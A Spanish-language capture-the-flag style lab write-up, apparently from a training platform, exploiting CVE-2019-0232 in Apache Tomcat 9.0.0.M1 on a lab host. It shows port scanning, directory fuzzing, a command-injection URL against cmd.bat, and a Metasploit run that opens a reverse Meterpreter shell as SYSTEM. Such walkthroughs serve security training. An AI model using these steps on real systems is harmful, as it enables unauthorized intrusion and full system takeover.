
# Lab - Ataques a Aplicaciones I

## <mark style="color:purple;">**Skills Assestment I**</mark>

Durante una prueba de penetración contra la empresa Inlanefreight, ha realizado una enumeración exhaustiva y ha descubierto que la red está bastante bloqueada y bien protegida. Se encuentra con un host de particular interés que puede ser su boleto para una entrada inicial. Enumere el host de destino en busca de aplicaciones potencialmente vulnerables, obtenga una entrada y envíe el contenido del archivo flag.txt para completar esta parte de la evaluación de habilidades.

```
Objetivo: 10.129.201.89
```

***

## <mark style="color:purple;">Pregunta 1</mark>

> ¿Qué aplicación vulnerable se está ejecutando, en que puerto se ejecuta y qué versión tiene?

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.201.89 

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Jetty 9.4.42.v20210604
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
```

El escaneo con Nmap nos devuelve varios puertos interesantes, en el que destacamos el puerto 8080 con una aplicación Apache Tomcat que en principio es bastante vulnerable.

<figure><img src="/files/SA7ThNAvicCHryQYFZFj" alt=""><figcaption></figcaption></figure>

Al acceder por el navegador nos encontramos la versión: `9.0.0.M1`, lo que nos permitiría buscar un exploit válido. También intentamos accede a los directorio `/manager` y `/host-manager` pero no tenemos acceso:

<figure><img src="/files/iUEaLE00VtCm8g6zzd6w" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Pregunta 2</mark>

> Utilice la aplicación para obtener un shell y enviar el contenido del archivo flag.txt en el escritorio del Administrador.

### Acceso FTP

Tenemos el login `anonymous` habilitado en FTP pero no nos podemos descargar el archivo de backup que contiene:

```bash
ftp 10.129.201.89      
      
Connected to 10.129.201.89.
220 Microsoft FTP Service
Name (10.129.201.89:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49688|)
150 Opening ASCII mode data connection.
09-01-21  07:07AM       <DIR>          website_backup
226 Transfer complete.
ftp> get website_backup
local: website_backup remote: website_backup
229 Entering Extended Passive Mode (|||49690|)
550 Access is denied.
```

### Fuzzing

Encontramos un directorio `WEB-INF` interesante que contiene un directorio `/cgi`.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.201.89:8080/FUZZ -t 100 -mc 200,301,302,403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.89:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

WEB-INF                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 110ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 110ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 105ms]
```

También podríamos directamente a fuzzear el directorio `/cgi` para encontrar posibles archivos `.bat` que nos sirvan para ejecutar comandos:

```
ffuf -u http://10.129.201.89:8080/cgi/FUZZ.bat -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,403 
 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.89:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,403
________________________________________________

cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 945ms]
```

Encontramos un archivo cmd.bat que en principio podemos usar para ejecutar comandos. Vamos a probarlo. Accedemos a:

```
http://10.129.201.89:8080/cgi/cmd.bat%20%20?&dir
```

Y obtenemos lo esperado, la ejecución del comando `dir`:

<figure><img src="/files/xxZ8KL7i6O6JJA79IwnT" alt=""><figcaption></figcaption></figure>

### Exploit

Encontramos este repositorio donde indica los pasos de explotación:

{% embed url="<https://github.com/setrus/CVE-2019-0232>" %}

Ahora que tenemos el archivo cmd.bat que podemos explotar vamos a usar un módulo de Metasploit para ganar acceso con Meterpreter:

```bash
msf6 > search CVE-2019-0232

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/tomcat_cgi_cmdlineargs

msf6 > use 0
```

```bash
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set rhosts 10.129.201.89
rhosts => 10.129.201.89
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set targeturi /cgi/cmd.bat
targeturi => /cgi/cmd.bat
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set lhost tun0
lhost => 10.10.15.109
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set ForceExploit true
ForceExploit => true
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > exploit

[*] Started reverse TCP handler on 10.10.15.109:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (177734 bytes) to 10.129.201.89
[*] Command Stager progress - 100.00% done (100668/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.15.109:4444 -> 10.129.201.89:49692) at 2025-02-11 19:48:36 +0000

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Tenemos un Meterpreter como SYSTEM en el objetivo. Vamos a leer la flag:

```bash
meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-08-17 03:48:56 +0000  desktop.ini
100666/rw-rw-rw-  32    fil   2021-09-29 16:22:44 +0000  flag.txt

meterpreter > cat flag.txt 
f55763d31a8f63e*********************
```
